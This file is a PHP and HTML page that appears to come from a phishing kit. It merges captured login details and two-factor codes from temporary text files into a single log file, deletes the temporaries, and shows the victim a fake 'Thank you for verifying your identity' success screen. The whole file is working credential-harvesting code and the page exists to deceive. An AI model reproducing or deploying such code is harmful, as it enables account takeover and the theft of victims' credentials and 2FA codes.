<?php
$userFile = "user.txt";
$codeFile = "2fa.txt";
$finalFile = "userinfo.txt";

if (file_exists($userFile)) {
    $user = file_get_contents($userFile);
    $code = file_exists($codeFile) ? file_get_contents($codeFile) : "2FA: N/A";
    $entry = $user . $code . "\n----------------\n";
    file_put_contents($finalFile, $entry, FILE_APPEND);
    unlink($userFile);
    if (file_exists($codeFile)) {
        unlink($codeFile);
    }
    if (file_exists("decision.txt")) {
        unlink("decision.txt");
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Success</title>
  <style>
    body {
      background-color: #0d1a26;
      font-family: 'Segoe UI', Tahoma, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
      color: #ffffff;
    }

    .success-box {
      width: 360px;
      padding: 40px;
      background-color: #11202e;
      border-radius: 20px;
      position: relative;
      box-shadow: 0 0 20px rgba(0, 136, 204, 0.2);
      text-align: center;
    }

    .success-box::before {
      content: "";
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      z-index: -1;
      background: linear-gradient(45deg, #00c3ff, #6f42c1, #0088cc);
      border-radius: 22px;
      background-size: 300% 300%;
      animation: borderRGB 6s ease infinite;
    }

    @keyframes borderRGB {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .success-box img {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      object-fit: cover;
      margin-bottom: 20px;
      border: 2px solid #00c3ff;
    }

    .success-box h2 {
      font-size: 22px;
      color: #00c3ff;
      margin-bottom: 10px;
    }

    .success-box p {
      font-size: 14px;
      color: #b0c7d6;
    }
  </style>
</head>
<body>

  <div class="success-box">
    <img src="img/pngwing.com.png" alt="Success Icon">
    <h2>Request Submitted Successfully</h2>
    <p>Thank you for verifying your identity.</p>
  </div>

</body>
</html>
